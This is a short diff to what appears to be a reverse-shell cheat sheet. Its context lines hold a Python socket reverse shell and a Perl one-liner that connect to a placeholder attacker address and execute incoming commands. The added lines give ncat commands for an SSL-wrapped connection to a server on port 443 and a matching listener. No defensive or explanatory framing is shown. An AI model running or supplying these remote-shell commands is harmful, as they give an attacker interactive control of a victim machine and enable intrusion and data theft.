@@ -42,3 +42,8 @@ python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SO
 #perl
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP_ADDRESS>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
+#ncat
+ncat --ssl-ciphers <HIGH:!aNULL:!eNULL> <server> 443
+
+#ncat server
+ncat -v --listen --ssl
